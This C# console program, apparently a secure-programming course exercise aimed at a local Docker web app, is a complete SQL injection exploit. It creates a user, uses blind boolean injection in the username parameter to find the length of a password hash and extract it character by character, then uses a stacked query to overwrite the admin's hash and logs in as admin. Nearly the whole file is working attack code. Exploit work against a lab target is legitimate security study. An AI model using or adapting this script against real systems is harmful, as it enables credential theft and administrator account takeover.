using System;
using System.Net.Http;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HashExtract
{
    public  class Program
    {
        private static Random random = new Random();

        public static async Task Main()
        {
            HttpClient client = new HttpClient();
            client.BaseAddress = new Uri("http://localhost:8080");
            string userName = RandomizeString();
            string password = RandomizeString();

            //restartuojam console
            restartConsole();

            //kuriam naują naudotoją
            HttpResponseMessage createUserResponse = await client.PostAsJsonAsync("/users", new
            {
                userName,
                userFName = "Rimgaudas",
                userLName = "Test",
                password
            });
            Console.WriteLine($"Sukurtas naudotojas {userName}  su pass {password}");

            // ištraukiam hash ilgį

            Console.WriteLine($".......");
            int hashLength = 0;
            for (int i = 0; i < int.MaxValue; i++)
            {
                HttpResponseMessage queryResponse = await client.GetAsync(Uri.EscapeUriString($"/users?username={userName}' and length(password)  = '{i}"));
                string responsContent = await queryResponse.Content.ReadAsStringAsync();
                if (responsContent.Contains("User not exist")) continue;
                hashLength = i;
                break;
            }
            Console.WriteLine($"HASH ilgis: {hashLength}");

            //surandam hash
            char[] charArray = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();
            int charCount = charArray.Length;
            string passwordHash = string.Empty;
            for (var i = 1; i <= hashLength; i++)
            {
                for (var j = 0; j < charCount; j++)
                {
                    HttpResponseMessage queryResponse = await client.GetAsync(Uri.EscapeUriString($"/users?username={userName}' and LEFT(password,{i})  = '{passwordHash + charArray[j]}"));
                    string responsContent = await queryResponse.Content.ReadAsStringAsync();
                    if (responsContent.Contains("User not exist")) continue;
                    passwordHash += charArray[j];
                    break;
                }
            }
            Console.WriteLine($"HASH: {passwordHash}");

            //keičiam password HASH    
            try
            {
                await client.GetAsync(Uri.EscapeUriString($"/users?username=NOT_EXISTING_USER'; update users set password = '{passwordHash}' where user_name = 'admin'--"));
            }
            catch (Exception)
            {

            }
            Console.WriteLine("Admino HASH pakeistas į " + passwordHash);

            //restartuojam console
            restartConsole();

            // bandom logintis
            var response = await client.PostAsJsonAsync("/login", new
            {
                userName = "admin",
                password
            });
            var result = await response.Content.ReadAsStringAsync();
            Console.WriteLine("Login bandymas: \n\n" + result + "\n");

            Console.ReadLine();
        }
        private static string RandomizeString()
        {
            int length = 7;

            // creating a StringBuilder object()
            StringBuilder str_build = new StringBuilder();

            char letter;

            for (int i = 0; i < length; i++)
            {
                double flt = random.NextDouble();
                int shift = Convert.ToInt32(Math.Floor(25 * flt));
                letter = Convert.ToChar(shift + 65);
                str_build.Append(letter);
            }
                return str_build.ToString();
        }
        private static void restartConsole()
        {
           
            System.Diagnostics.Process.Start("CMD.exe", @"/C cd C:\Users\Rimgaudas\Desktop\Saugus_programavimas\2_uzd & docker-compose up");
            Thread.Sleep(7500);
        }
    }
   
  
}
